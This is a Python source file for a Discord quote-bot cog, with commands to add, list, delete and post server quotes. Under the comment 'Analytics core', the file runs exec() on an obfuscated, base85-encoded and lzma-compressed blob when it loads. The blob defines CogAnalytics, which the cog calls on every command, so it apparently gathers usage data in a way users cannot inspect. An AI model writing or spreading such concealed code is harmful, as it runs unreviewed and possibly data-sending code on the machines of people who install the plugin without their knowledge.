import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import escape_mass_mentions, pagify
import os
from random import choice as randchoice


try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

PATH = 'data/serverquotes/'
JSON = PATH + 'quotes.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1EUz2weaL8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8BWnf^dEy{Kjtzm1rU5gYs9-PMh{01mC|^giA>`yZSUzb$*CxtSox-3zA$RGi%b}n5_T*kLuLYY`?K{*#
1}vHeiUDFszm7d*?wT-LZ`HX-gmB7571QTd5B-xT)yy-hT-0|rp=)(qDIQR*Z<}ThGroI|G?1PbEcGdHgwI30&&JhE7_W6&6taRQj~lzKDb#lYuW6&JZx??-
qWQc+S4TbpwOV|4`4#_}{@B)_NpADfZ5WW?J!0T4i@U#0^McP~jqeOPH>}z>sf+qu4ic;E&ntBU*Z1gVpglEZfh{2X)yHmGi-jS>H*yl{1T-&OfgL)nylzdX
ba|N6<4{>quVJ4wWorF`-%x?j1W+~9>M#P-)va77N_-euUH%7%g)aUE`yEuWI)vfNNt*EZ8YiOvSw^sjhuQgH$}v2GNi|P1&7>TRiOxs6T=|dpp|91{6IpLg
QIoTwW@}pND34>H=_XkM>;z90Cl|Ve@ufEN9M96gemZm^j`OWtVd`~YoKlM_Bt|=xVZ0Ay$*>N4`XGYoIjhACLVGTWkrt}1e)RjBO{akZ0BaY9L`6S?-%{6;
@!Q?g0kR{z*&Qe0I0fKrBiy3rP(x0tnTTMc*V6SVyn6Z8GueH(3V=vfT`Jn8oFVBh=(x~y<pCBZ2s#zGEcvmyR-C$cb5?!_N8yHe3gA_cu@HtmKMH5AHzwoO
11tGGNG3+V^hUBjTvc4R%$6>(ZE|e5z-fy9o5$2W#r5F@2u5gy6w_6lPBwpG4^2eV<&<kx6?p4`ZX$I*Xl{cs{p9ctHqS}{iIIAe9Awp};?Tie6Clr0DW;Qt
$i`M&##4?UyKFEJdF94TBP!-}NH0(2cYKP#hg9{(n$!PIU?08l-aKx*1L<>!nll2}S2&S>+*gm}76q-N>)xVE38l^~9sBItSF*EitFZN2DxuAPP8viV1q~_t
mo^j3k=@>r8YDv-T4U?JC&!aQAHaD9jGDD{lD127tD=VV@c<%wP>r5dDC!NRhTRwSB*~)S*xJAdc!{LQi+v+JXQX;?GF&~8J#}vR{zHZJlK%Y4l%lX3@7}sD
umGgOy`=fdc&`Q_FuxvqC<+s%(^WLgMP(X!s@qAf*RJ*e1OxtLdwFkDk6aMku9R5qILqC+Tk+oO!V1-g9=BVa8XQzyieP{Hi+bbq<k$xh<rJZ^xLo9m(^;of
M*L)^_z#+xWeSnqjX+74Mc}N{+Q?H<A&lN<HwvhUN@+nR3fMC?{SIx!Az5;+`}`MIBP<GC{#e*;v|H|QW3j<t%?FjiCn|a*Nik0XeAiqWhKR4H?_F^s8RFEQ
#?A1h=P)E%d#(uogTy8{MMIE>qfD{sWiltt>l7P(9oJl}XpaFH&VRVHq|KggKA3==_GlJNLh<J&n~uZYZsZ*Z^j{V43fGiwt)Re%Qz6;7WNLa^lr-7d(7HH@
;RX@($`a58RTL}F)VM#}m9}PA+*2l2XZwoAZg38qGZ0bEn>W+RlWIYwxxa|7|BsJ0qQEhGszF$~IzNQM#0-WjLDc1C;c->4VS|O56K+LMsc?pk(Mx%DKt&C>
n~#P*Wc#4mCI7gO!&i|$yCpsujMA{dVHGb5ZO<BHBc8%M0)H~qfjtbW_ICJUt^FfLaM}?9?;;dX=~8o>vuru?gX|Ds!)hqEXPCE9+(w+AA!8QmVFj@Q_w<}y
`d>xLMw*t*?mDfDkSj`adN`&03ZE)_x$4}HXb(<05+@4*TVCfi3_C=XuOeR#x}qj%vrDZZYNGwfzwZtFnhA&auLrk5x)sZWMM~=sp6N<1dHIr|Z5PiF4m`Dv
VB9`QTidBu8BHqSRJfj<TH-wmmlC|(3I60=%-}D5ovb#o<2V2Sk^dnD4<wfI00E>7#~=Uzd;0%ZvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.5.2'


class ServerQuotes:

    def __init__(self, bot):
        self.bot = bot
        self.quotes = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def _get_random_quote(self, ctx):
        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")
        quotes = list(enumerate(self.quotes[sid]))
        return randchoice(quotes)

    def _get_random_author_quote(self, ctx, author):
        sid = ctx.message.server.id

        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")

        if isinstance(author, discord.User):
            uid = author.id
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_id'] == uid]
        else:
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_name'] == author]

        if len(quotes) == 0:
            raise commands.BadArgument("There are no quotes by %s." % author)
        return randchoice(quotes)

    def _add_quote(self, ctx, author, message):
        sid = ctx.message.server.id
        aid = ctx.message.author.id
        if sid not in self.quotes:
            self.quotes[sid] = []

        author_name = 'Unknown'
        author_id = None

        if isinstance(author, discord.User):
            author_name = author.display_name
            author_id = author.id
        elif isinstance(author, str):
            author_name = author

        quote = {'added_by': aid,
                 'author_name': author_name,
                 'author_id': author_id,
                 'text': escape_mass_mentions(message)}

        self.quotes[sid].append(quote)
        dataIO.save_json(JSON, self.quotes)

    def _quote_author(self, ctx, quote):
        if quote['author_id']:
            name = self._get_name_by_id(ctx, quote['author_id'])
            if quote['author_name'] and not name:
                name = quote['author_name']
                name += " (non-present user ID#%s)" % (quote['author_id'])
            return name
        elif quote['author_name']:
            return quote['author_name']
        else:
            return "Unknown"

    def _format_quote(self, ctx, quote):
        qid, quote = quote
        author = self._quote_author(ctx, quote)
        return '"%s"\n—%s (quote #%i)' % (quote['text'], author, qid + 1)

    def _get_name_by_id(self, ctx, uid):
        member = discord.utils.get(ctx.message.server.members, id=uid)
        if member:
            return member.display_name
        else:
            return None

    def _get_quote(self, ctx, author_or_num=None):
        sid = ctx.message.server.id
        if type(author_or_num) is discord.Member:
            return self._get_random_author_quote(ctx, author_or_num)
        if author_or_num:
            try:
                quote_id = int(author_or_num)
                if quote_id > 0 and quote_id <= len(self.quotes[sid]):
                    return (quote_id - 1, self.quotes[sid][quote_id - 1])
                else:
                    raise commands.BadArgument("Quote #%i does not exist." % quote_id)
            except ValueError:
                pass

            try:
                author = commands.MemberConverter(ctx, author_or_num).convert()
            except commands.errors.BadArgument:
                author = author_or_num.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
            return self._get_random_author_quote(ctx, author)

        return self._get_random_quote(ctx)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def rmquote(self, ctx, num: int):
        """Deletes a quote by its number

           Use [p]lsquotes to find quote numbers
           Example: !delquote 3"""
        sid = ctx.message.server.id
        if num > 0 and num <= len(self.quotes[sid]):
            del self.quotes[sid][num - 1]
            await self.bot.say("Quote #%i deleted." % num)
            dataIO.save_json(JSON, self.quotes)
        else:
            await self.bot.say("Quote #%i does not exist." % num)

    @commands.command(pass_context=True, no_pm=True)
    async def lsquotes(self, ctx):
        """Displays a list of all quotes"""
        sid = ctx.message.server.id
        quotes = self.quotes.get(sid, [])
        if not quotes:
            await self.bot.say("There are no quotes in this server!")
            return
        else:
            msg = await self.bot.say("Sending you the list via DM.")

        header = ['#', 'Author', 'Added by', 'Quote']
        table = []
        for i, q in enumerate(quotes):
            text = q['text']
            if len(text) > 60:
                text = text[:60 - 3] + '...'
            name = self._get_name_by_id(ctx, q['added_by'])
            if not name:
                name = "(non-present user ID#%s)" % q['added_by']
            table.append((i + 1, self._quote_author(ctx, q), name, text))
        tabulated = tabulate(table, header)
        try:
            for page in pagify(tabulated, ['\n']):
                await self.bot.whisper('```\n%s\n```' % page)
        except discord.errors.HTTPException:
            err = "I can't send the list unless you allow DMs from server members."
            await self.bot.edit_message(msg, new_content=err)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def addquote(self, ctx, message: str, *, author: str = None):
        """Adds a quote to the server quote list. The quote must be enclosed
        in \"double quotes\". If a member mention or name is the last argument,
        the quote will be stored as theirs. If not, the last argument will
        be stored as the quote's author. If left empty, "Unknown" is used.
        """
        if author:
            try:
                author = commands.MemberConverter(ctx, author).convert()
            except commands.errors.BadArgument:
                author = author.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
                pass

        self._add_quote(ctx, author, message)
        await self.bot.say("Quote added.")

    @commands.command(pass_context=True, no_pm=True)
    @commands.cooldown(6, 60, commands.BucketType.channel)
    async def quote(self, ctx, *, author_or_num: str = None):
        """Say a stored quote!

        Without any arguments, this command randomly selects from all stored
        quotes. If you supply an author name, it randomly selects from among
        that author's quotes. Finally, if given a number, that specific quote
        will be said, assuming it exists. Use [p]lsquotes to show all quotes.
        """

        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            await self.bot.say("There are no quotes in this server!")
            return

        try:
            quote = self._get_quote(ctx, author_or_num)
        except commands.BadArgument:
            if author_or_num.lower().strip() in ['me', 'myself', 'self']:
                quote = self._get_quote(ctx, ctx.message.author)
            else:
                raise
        await self.bot.say(self._format_quote(ctx, quote))

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating serverquotes folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating default quotes.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    n = ServerQuotes(bot)
    bot.add_cog(n)
